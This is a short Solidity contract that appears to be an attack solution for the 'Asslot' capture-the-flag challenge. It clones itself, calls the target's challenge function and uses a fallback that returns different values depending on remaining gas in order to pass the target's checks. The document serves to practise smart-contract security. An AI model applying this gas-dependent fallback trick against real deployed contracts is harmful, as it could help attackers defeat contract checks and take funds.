// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
import "./Asslot.sol";
import "@openzeppelin/contracts/proxy/Clones.sol";
import "hardhat/console.sol";

contract AsslotNumen23Attack {
    address public proxyAddress;

    function clone() public {
        proxyAddress = Clones.clone(address(this));
    }

    function solve(address target) public {
        AsslotNumen23 a = AsslotNumen23(target);
        a.f00000000_bvvvdlt();
    }

    fallback(bytes calldata /*data*/) external returns(bytes memory retVal) {
        if (gasleft() < 249000) {
            console.log(gasleft());
            return abi.encode(3);
        }
        else if (gasleft() < 250000) {
            console.log(gasleft());
            return abi.encode(2);
        }
        else if (gasleft() < 253000) {
            console.log(gasleft());
            return abi.encode(1);
        }
        else {
            console.log(gasleft());
            return abi.encode(0);
        }
    }

}


